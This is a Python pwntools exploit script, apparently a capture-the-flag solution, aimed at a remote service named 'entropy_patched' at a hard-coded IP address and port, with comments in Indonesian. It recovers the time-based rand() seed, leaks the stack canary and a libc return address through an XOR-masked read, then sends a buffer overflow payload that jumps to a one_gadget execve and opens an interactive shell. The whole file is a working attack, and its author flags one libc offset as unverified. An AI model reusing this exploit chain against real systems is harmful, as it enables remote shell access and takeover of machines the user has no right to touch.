from pwn import *
import ctypes
import time

context.binary = elf = ELF('./entropy_patched') 
context.log_level = 'info'

libc = ELF('./libc6_2.42-0ubuntu3_amd64.so', checksec=False) 
libc_rand = ctypes.CDLL(libc.path)

OFFSET_LEAK_TO_BASE = 0x2a575

# GANTI PORT SESUAI INSTANCE YANG AKTIF SAAT INI
p = remote('103.152.242.90', 29730) 

# 1. SYNC SEED
log.info("Syncing seed time...")
p.sendline(b'72') 
server_rand = int(p.recvline().strip())

valid_seed = None
now = int(time.time())
for delta in range(-60, 61):
    test_seed = now + delta
    libc_rand.srand(test_seed)
    if (libc_rand.rand() & 0xff) == server_rand:
        valid_seed = test_seed
        log.success(f"Seed matched! Delta: {delta} seconds")
        break

if valid_seed is None:
    log.failure("Failed to sync seed.")
    exit(0)

libc_rand.srand(valid_seed)
libc_rand.rand() 

def leak_byte(offset):
    p.sendline(str(offset).encode())
    line = p.recvline().strip()
    val = int(line)
    r = libc_rand.rand() & 0xff
    return val ^ r

# 2. LEAK CANARY & RET ADDR
canary = b'\x00' 
for i in range(73, 80):
    canary += p8(leak_byte(i))
canary = u64(canary)

ret_addr = b''
for i in range(104, 112):
    ret_addr += p8(leak_byte(i))
ret_addr = u64(ret_addr)

# 3. HITUNG BASE
libc.address = ret_addr - OFFSET_LEAK_TO_BASE
log.success(f"Libc Base: {hex(libc.address)}")

if libc.address & 0xfff != 0:
    log.failure("Libc Base tidak berakhiran 000! Leak gagal, coba jalankan ulang.")
    exit(0)

# GUNAKAN ONE GADGET DENGAN RBP = ENVIRON
one_gadget_offset = 0xf8d09
# Alamat environ (writable) - pastikan offset 0x222200 ini benar untuk libc 2.42
writable_libc = libc.address + 0x222200 

one_gadget = libc.address + one_gadget_offset
log.info(f"One Gadget (execve): {hex(one_gadget)}")
log.info(f"Writable RBP (environ): {hex(writable_libc)}")

# 4. PAYLOAD (Total 112 byte)
payload = b'A' * 72
payload += p64(canary)
payload += b'B' * 8    # Gap 8 byte
payload += p64(0)      # Saved RBX
payload += p64(writable_libc) # Saved RBP (Memenuhi syarat rbp-0x50 writable)
payload += p64(one_gadget)

p.sendline(payload)
p.interactive()